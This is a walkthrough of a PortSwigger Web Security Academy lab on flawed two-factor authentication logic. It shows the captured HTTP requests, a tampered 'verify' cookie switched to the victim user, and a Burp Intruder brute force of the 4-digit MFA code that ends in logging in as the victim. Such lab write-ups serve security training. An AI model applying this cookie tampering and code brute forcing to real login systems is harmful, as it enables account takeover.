# Lab: 2FA broken logic

### Instructions

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

- Your credentials: wiener:peter
- Victim's username: carlos

You also have access to the email server to receive your 2FA verification code. 

### Solution

Capturing a login request in Burp as user wiener, we can forward it on and get this response:

```
HTTP/2 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=1fBnxkrcBPBx1xzaWFPx2U5Bdb1AUFAy; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Looking at the provided email client we find the following message:

```
Hello!

Your security code is 1897.

Please enter this in the app to continue.

Thanks,
Support team
```

Capturing this request in Burp we see how the code is being passed:

```
POST /login2 HTTP/2
Host: 0abd003803181a4d80ae670a00790055.web-security-academy.net
Cookie: session=UrLVjCEeH1nTwMxMUjYx3ddRp4V2rYle; verify=wiener
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0abd003803181a4d80ae670a00790055.web-security-academy.net
Referer: https://0abd003803181a4d80ae670a00790055.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=0963
```

Knowing now how the application behaves we can again login as wiener and then capture the 2fa code input in Burp and send this to Intruder:

```
POST /login2 HTTP/2
Host: 0abd003803181a4d80ae670a00790055.web-security-academy.net
Cookie: session=UrLVjCEeH1nTwMxMUjYx3ddRp4V2rYle; verify=wiener
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0abd003803181a4d80ae670a00790055.web-security-academy.net
Referer: https://0abd003803181a4d80ae670a00790055.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=0963
```

We can update the Cookie to our target user carlos:

```
Cookie: session=UrLVjCEeH1nTwMxMUjYx3ddRp4V2rYle; verify=carlos
```

And then we can begin bruteforcing the 2fa code using a Sniper attack. For our payload we can use a sequential number range: 0-9999, making sure to set the option `Min integer digits` to 4, to match the 2fa code format:

```
mfa-code=§0963§
```

Cross your fingers the 2fa code generated for your lab comes early on the list, because bruteforcing like this using Burp community takes forever.

```
537	0536	302	340	false	false	188	
0		200	334	false	false	3379	
1	0000	200	296	false	false	3379	
2	0001	200	334	false	false	3379	
3	0002	200	335	false	false	3379	
4	0003	200	328	false	false	3379		
```

Nice, we've got a hit with a 302.

We can click on the successful request and select "Request in browser", which logs us in as carlos and completes the lab:

```
My Account

Your username is: carlos

Your email is: carlos@carlos-montoya.net
```